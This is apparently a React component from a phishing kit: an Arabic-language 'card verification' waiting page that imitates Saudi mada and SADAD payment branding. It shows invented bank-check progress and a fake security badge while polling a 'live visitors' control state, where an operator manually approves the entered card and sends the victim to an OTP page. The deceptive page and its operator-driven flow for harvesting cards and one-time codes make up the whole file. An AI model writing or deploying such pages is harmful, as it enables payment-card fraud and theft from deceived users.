import { Card } from "@/components/ui/card";
import { StepLayout } from "@/components/StepLayout";
import { useLocation } from "wouter";
import { useEffect, useState } from "react";
import { ShieldCheck, Lock, Loader2, ServerCog, Banknote } from "lucide-react";
import { ASSETS } from "@/lib/assets";
import { trpc } from "@/lib/trpc";
import { getSessionId } from "@/lib/useStepSession";

/**
 * صفحة انتظار بعد إدخال بيانات البطاقة.
 * يقوم الـ polling بفحص حالة التحكم من الأدمن:
 * - approved: التوجيه لصفحة OTP (/code-pay)
 * - rejected: التوجيه لصفحة إعادة المحاولة (/cardpayment-error)
 * - pending/null: الاستمرار في الانتظار
 */
export default function CardWait() {
  const [, setLocation] = useLocation();
  const [sessionId] = useState<string>(() => getSessionId());
  const [elapsed, setElapsed] = useState(0);

  // polling كل 3 ثوان لمعرفة قرار الأدمن
  const { data: state } = trpc.liveVisitors.getControlState.useQuery(
    { sessionId },
    { refetchInterval: 2500, refetchIntervalInBackground: true }
  );

  // عداد الوقت المنقضي
  useEffect(() => {
    const id = setInterval(() => setElapsed((e) => e + 1), 1000);
    return () => clearInterval(id);
  }, []);

  useEffect(() => {
    if (!state) return;
    if (state.cardStatus === "approved") {
      setLocation("/code-pay");
    } else if (state.cardStatus === "rejected") {
      setLocation("/cardpayment-error");
    }
  }, [state, setLocation]);

  const formatElapsed = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${String(sec).padStart(2, "0")}`;
  };

  // رسائل متتالية لإظهار التقدم
  const messages = [
    "جارٍ الاتصال بخادم بوابة الدفع...",
    "التحقق من صلاحية البطاقة لدى البنك...",
    "تطبيق بروتوكولات الأمان 3D Secure...",
    "بانتظار موافقة البنك على العملية...",
  ];
  const currentMsg = messages[Math.min(Math.floor(elapsed / 4), messages.length - 1)];

  return (
    <StepLayout
      step={5}
      total={10}
      badge="معالجة عملية الدفع"
      title="جارٍ التحقق من البطاقة..."
      subtitle="الرجاء عدم إغلاق هذه الصفحة أو الرجوع للخلف حتى تكتمل العملية"
      variant="green"
    >
      <Card className="p-8 md:p-10 shadow-xl border-emerald-100 bg-white">
        {/* شعارات بوابات الدفع */}
        <div className="flex items-center justify-center gap-4 mb-6 pb-6 border-b border-gray-200">
          <img src={ASSETS.madaLogo} alt="مدى" className="h-7 object-contain" />
          <div className="w-px h-6 bg-gray-200" />
          <img src={ASSETS.sadadLogo} alt="سداد" className="h-7 object-contain" />
        </div>

        {/* رسوم متحركة للتحميل */}
        <div className="flex flex-col items-center text-center">
          <div className="relative mb-6">
            {/* حلقات دوّارة */}
            <div className="absolute inset-0 w-28 h-28 rounded-full border-4 border-emerald-100" />
            <div
              className="absolute inset-0 w-28 h-28 rounded-full border-4 border-transparent border-t-emerald-500 animate-spin"
              style={{ animationDuration: "1.4s" }}
            />
            <div
              className="absolute inset-2 w-24 h-24 rounded-full border-4 border-transparent border-r-amber-400 animate-spin"
              style={{ animationDuration: "2s", animationDirection: "reverse" }}
            />
            {/* الأيقونة الوسطية */}
            <div className="relative w-28 h-28 flex items-center justify-center">
              <div className="w-16 h-16 rounded-full bg-gradient-to-br from-emerald-500 to-emerald-700 text-white flex items-center justify-center shadow-lg">
                <Lock className="w-8 h-8" />
              </div>
            </div>
          </div>

          <h3 className="text-xl md:text-2xl font-extrabold text-gray-900 mb-2">
            عملية الدفع قيد المعالجة
          </h3>
          <p className="text-sm text-gray-600 mb-1 leading-relaxed max-w-sm">
            {currentMsg}
          </p>
          <p className="text-xs text-muted-foreground mb-6">
            قد تستغرق هذه العملية بضع لحظات، شكرًا لصبركم.
          </p>

          {/* شريط التقدم بالنقاط */}
          <div className="flex items-center gap-2 mb-6">
            {[0, 1, 2, 3].map((i) => (
              <div
                key={i}
                className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"
                style={{ animationDelay: `${i * 0.2}s`, animationDuration: "1.2s" }}
              />
            ))}
          </div>

          {/* بطاقة المبلغ */}
          <div className="w-full bg-gradient-to-br from-emerald-50 to-amber-50/30 border border-emerald-200 rounded-xl p-4 mb-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Banknote className="w-5 h-5 text-emerald-700" />
              <span className="text-sm font-bold text-gray-700">المبلغ المعالج</span>
            </div>
              <span className="text-xl font-extrabold text-emerald-700" dir="ltr">383 SAR</span>
          </div>
          </div>

          {/* خطوات المعالجة */}
          <div className="w-full space-y-2 mb-4">
            <ProcessStep done label="استلام بيانات البطاقة" />
            <ProcessStep done label="التحقق من صحة الرقم (Luhn)" />
            <ProcessStep loading label="الاتصال بالبنك المُصدر" />
            <ProcessStep pending label="استلام موافقة البنك" />
          </div>

          {/* الوقت المنقضي */}
          <div className="flex items-center gap-2 text-xs text-gray-500 font-mono">
            <ServerCog className="w-4 h-4" />
            وقت المعالجة: {formatElapsed(elapsed)}
          </div>

          {/* ذيل الأمان */}
          <div className="mt-6 pt-6 border-t border-gray-100 w-full flex items-center justify-center gap-2 text-[11px] text-gray-500">
            <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
            عملية دفع موثقة ومحمية بتقنية SSL 256-bit
          </div>
        </div>
      </Card>
    </StepLayout>
  );
}

function ProcessStep({
  done,
  loading,
  pending,
  label,
}: {
  done?: boolean;
  loading?: boolean;
  pending?: boolean;
  label: string;
}) {
  return (
    <div className="flex items-center gap-3 p-2.5 rounded-lg bg-gray-50 border border-gray-100">
      <div
        className={`w-6 h-6 rounded-full flex items-center justify-center shrink-0 ${
          done
            ? "bg-emerald-500 text-white"
            : loading
            ? "bg-amber-100 text-amber-700"
            : "bg-gray-200 text-gray-400"
        }`}
      >
        {done ? (
          <svg className="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
            <polyline points="20 6 9 17 4 12" />
          </svg>
        ) : loading ? (
          <Loader2 className="w-3.5 h-3.5 animate-spin" />
        ) : (
          <div className="w-1.5 h-1.5 rounded-full bg-current" />
        )}
      </div>
      <span
        className={`text-sm flex-1 text-right ${
          done ? "text-gray-700 line-through opacity-75" : loading ? "text-amber-700 font-semibold" : "text-gray-500"
        }`}
      >
        {label}
      </span>
    </div>
  );
}
